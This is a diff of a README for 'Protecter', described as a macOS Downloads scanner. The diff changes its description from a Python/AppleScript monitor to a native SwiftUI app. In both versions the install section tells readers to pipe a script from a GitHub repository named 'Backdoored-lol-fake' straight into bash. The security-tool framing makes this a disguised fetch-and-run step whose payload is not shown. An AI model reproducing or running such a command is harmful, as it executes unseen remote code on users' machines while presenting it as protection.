@@ -1,6 +1,6 @@
-# Protecter for macOS
+# Protecter — Native macOS App
 
-Protecter is a small original macOS Downloads monitor. It uses the Python 3 and AppleScript tools included with macOS; it does not require Homebrew or ClamAV.
+Protecter is a standalone SwiftUI macOS application compiled to a native executable inside `Protecter.app`. It is not an AppleScript wrapper, web app, or background service.
 
 ## Install
 
@@ -8,21 +8,15 @@ Protecter is a small original macOS Downloads monitor. It uses the Python 3 and 
 curl -fsSL https://raw.githubusercontent.com/ttmeticks-source/Backdoored-lol-fake/main/install.sh | bash
 ```
 
-Creates **`~/Applications/Protecter.app`** and starts a background monitor at login.
+Requires macOS 14+ and Apple's Swift compiler. Install Apple's Command Line Tools with `xcode-select --install` if `swiftc` is unavailable. No Homebrew or ClamAV.
 
 ## What it does
 
-- Checks files in Downloads, including files already there on first run.
-- Skips unchanged files on later passes.
-- Looks for combinations of suspicious command patterns in common script files.
-- Uses macOS Gatekeeper to assess downloaded app bundles.
-- Moves flagged files into a local quarantine folder; it does not permanently delete them.
-- Does not upload files.
+- Native SwiftUI interface
+- Scans files in Downloads when you press Scan Downloads
+- Checks common script files for combinations of suspicious command indicators
+- Displays matches and lets you reveal each file in Finder
+- Does not delete, move, or modify files
+- No LaunchAgent or background service
 
-**Limitations:** Protecter is a basic heuristic checker, not a full antivirus product. It can miss threats and can flag legitimate scripts or unsigned apps. Keep macOS security protections enabled and review quarantined items before restoring or deleting them.
-
-## Locations
-
-- App: `~/Applications/Protecter.app`
-- Quarantine: `~/Library/Application Support/Protecter/Quarantine`
-- Logs: `~/Library/Application Support/Protecter/Logs`
+This is a basic heuristic review tool, not a full antivirus. It may miss threats or flag legitimate scripts.
